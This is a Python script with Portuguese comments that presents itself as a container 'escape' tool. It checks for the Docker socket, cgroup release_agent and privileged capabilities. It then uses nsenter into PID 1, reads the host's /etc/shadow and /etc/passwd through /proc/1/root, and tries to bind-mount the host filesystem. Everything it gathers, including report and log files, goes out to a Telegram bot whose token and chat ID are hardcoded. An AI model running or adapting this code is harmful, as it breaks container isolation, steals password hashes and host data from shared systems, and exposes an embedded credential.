#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import json
import socket
from datetime import datetime
from pathlib import Path

# ============================================================
# VERIFICAÇÃO DE DEPENDÊNCIAS
# ============================================================
try:
    import requests
except ImportError:
    print("[!] Biblioteca 'requests' não instalada. Instalando...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# ============================================================
# CONFIGURAÇÕES DO TELEGRAM
# ============================================================
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

# ============================================================
# CONFIGURAÇÕES GLOBAIS
# ============================================================
LOG_FILE = f"escape_log_{int(time.time())}.log"
REPORT_FILE = f"escape_report_{int(time.time())}.json"

# ============================================================
# FUNÇÕES DE LOG
# ============================================================
def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] [{level}] {msg}"
    print(line)
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(line + '\n')
    return line

# ============================================================
# FUNÇÕES DE ENVIO PARA TELEGRAM (COM TESTE DE CONECTIVIDADE)
# ============================================================
def test_telegram_connection():
    """Testa se o bot do Telegram está acessível."""
    log("🔍 Testando conexão com Telegram...")
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200 and r.json().get("ok"):
            log("✅ Conexão com Telegram OK.")
            return True
        else:
            log(f"❌ Falha na conexão: {r.text}", "ERROR")
            return False
    except Exception as e:
        log(f"❌ Erro ao conectar ao Telegram: {e}", "ERROR")
        return False

def send_telegram(text, parse_mode='Markdown'):
    """Envia mensagem para o Telegram com retry."""
    if not test_telegram_connection():
        log("⚠️ Telegram indisponível. Salvando mensagem localmente.", "WARN")
        with open("telegram_fallback.txt", "a", encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()} - {text}\n")
        return False

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}
    for attempt in range(3):
        try:
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                log(f"✅ Mensagem enviada: {text[:50]}...")
                return True
            else:
                log(f"❌ Tentativa {attempt+1}: HTTP {r.status_code}", "ERROR")
                time.sleep(2)
        except Exception as e:
            log(f"❌ Tentativa {attempt+1}: {e}", "ERROR")
            time.sleep(2)
    log("❌ Falha ao enviar mensagem após 3 tentativas.", "ERROR")
    return False

def send_telegram_file(filename, caption=""):
    """Envia um arquivo para o Telegram."""
    if not os.path.exists(filename):
        log(f"❌ Arquivo não encontrado: {filename}", "ERROR")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    files = {'document': open(filename, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
    try:
        r = requests.post(url, files=files, data=data, timeout=30)
        if r.status_code == 200:
            log(f"✅ Arquivo enviado: {filename}")
            return True
        else:
            log(f"❌ Erro HTTP {r.status_code}: {r.text}", "ERROR")
            return False
    except Exception as e:
        log(f"❌ Erro ao enviar arquivo: {e}", "ERROR")
        return False

def send_long_message(text, prefix="📦 Dados"):
    max_len = 4000
    parts = [text[i:i+max_len] for i in range(0, len(text), max_len)]
    for idx, part in enumerate(parts):
        send_telegram(f"{prefix} (parte {idx+1}/{len(parts)}):\n```\n{part}\n```")

# ============================================================
# FUNÇÕES DE DIAGNÓSTICO E ESCAPE
# ============================================================
def run_command(cmd, timeout=10):
    """Executa um comando e retorna a saída."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def check_docker():
    return run_command("docker --version 2>/dev/null || echo 'N/A'")

def check_nsenter():
    return run_command("nsenter --version 2>/dev/null || echo 'N/A'")

def check_docker_socket():
    return "OK" if os.path.exists('/var/run/docker.sock') else "N/A"

def check_cgroup():
    return "OK" if os.path.exists('/sys/fs/cgroup/release_agent') else "N/A"

def check_proc():
    return "OK" if os.path.exists('/proc/1/root/etc/shadow') else "N/A"

def check_privileged():
    try:
        with open('/proc/self/status', 'r') as f:
            for line in f:
                if 'CapEff' in line:
                    caps = int(line.split()[1], 16)
                    if caps & 0x0000003fffffffff:
                        return "PRIVILEGED"
                    else:
                        return f"CAPS: {hex(caps)}"
    except:
        pass
    return "N/A"

def check_mounts():
    output = run_command("mount | grep -E '/(host|root|mnt|hostfs)' || echo 'N/A'")
    return output if output != "N/A" else "Nenhum ponto suspeito"

# ============================================================
# TENTATIVAS DE ESCAPE
# ============================================================
def attempt_nsenter():
    log("🚀 Tentando nsenter...")
    commands = {
        "hostname": "hostname",
        "shadow": "cat /etc/shadow 2>/dev/null || echo 'N/A'",
        "passwd": "cat /etc/passwd 2>/dev/null || echo 'N/A'",
        "env": "env 2>/dev/null || echo 'N/A'",
        "ps": "ps auxfww 2>/dev/null || echo 'N/A'"
    }
    results = {}
    for key, cmd in commands.items():
        full_cmd = f"nsenter -t 1 -m -u -i -n sh -c '{cmd}' 2>/dev/null || echo 'FALHA'"
        results[key] = run_command(full_cmd)
    return results

def attempt_proc():
    log("🚀 Tentando /proc/1/root...")
    results = {}
    files = ["/etc/shadow", "/etc/passwd", "/etc/hostname", "/etc/resolv.conf"]
    for f in files:
        try:
            with open(f"/proc/1/root{f}", 'r', encoding='utf-8', errors='ignore') as fd:
                results[f] = fd.read()
        except:
            results[f] = "N/A"
    return results

def attempt_mount():
    log("🚀 Tentando montar /host...")
    try:
        os.makedirs('/host', exist_ok=True)
        result = subprocess.run(["mount", "--bind", "/", "/host"], capture_output=True, timeout=5)
        if result.returncode == 0:
            return {"status": "OK", "detail": "/host montado"}
        else:
            return {"status": "FALHA", "detail": result.stderr.decode()}
    except Exception as e:
        return {"status": "FALHA", "detail": str(e)}

# ============================================================
# COLETA DE DADOS DO HOST (FALLBACK)
# ============================================================
def collect_host_data():
    data = {
        "nsenter": attempt_nsenter(),
        "proc": attempt_proc(),
        "mount": attempt_mount()
    }
    return data

# ============================================================
# FUNÇÃO PRINCIPAL
# ============================================================
def main():
    log("🚀 Iniciando script de escape...")
    send_telegram("🚀 **Script de Escape Iniciado**")

    # 1. Diagnóstico
    log("📊 Coletando diagnóstico...")
    diagnostics = {
        "docker": check_docker(),
        "nsenter": check_nsenter(),
        "docker_socket": check_docker_socket(),
        "cgroup": check_cgroup(),
        "proc": check_proc(),
        "privileged": check_privileged(),
        "mounts": check_mounts()
    }

    diag_msg = "📊 **Diagnóstico do Ambiente**\n\n"
    for key, value in diagnostics.items():
        emoji = "✅" if value != "N/A" and "FALHA" not in value else "❌"
        diag_msg += f"{emoji} **{key.upper()}**: {value[:100]}\n"
    send_telegram(diag_msg)

    # 2. Tentativas de escape
    log("🔓 Tentando escapes...")
    send_telegram("🔓 **Iniciando tentativas de escape...**")
    escape_results = collect_host_data()

    # Envia resultados
    for method, result in escape_results.items():
        if isinstance(result, dict):
            for k, v in result.items():
                if v and v != "N/A" and "FALHA" not in v:
                    send_telegram(f"✅ **{method.upper()} - {k}**\n```\n{v[:300]}\n```")
        else:
            if result.get("status") == "OK":
                send_telegram(f"✅ **{method.upper()}** foi bem-sucedido!")
                send_telegram(f"```\n{result.get('detail', '')[:500]}\n```")
            else:
                send_telegram(f"❌ **{method.upper()}** falhou.")

    # 3. Salva relatório
    with open(REPORT_FILE, 'w') as f:
        json.dump(escape_results, f, indent=2, default=str)
    log(f"✅ Relatório salvo em {REPORT_FILE}")
    send_telegram_file(REPORT_FILE, caption="📁 Relatório completo")

    # 4. Envia logs
    if os.path.exists(LOG_FILE):
        send_telegram_file(LOG_FILE, caption="📁 Logs completos")

    log("✅ Script finalizado.")
    send_telegram("✅ **Script finalizado.**")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"❌ Erro crítico: {e}", "ERROR")
        send_telegram(f"❌ **Erro crítico:** `{e}`")
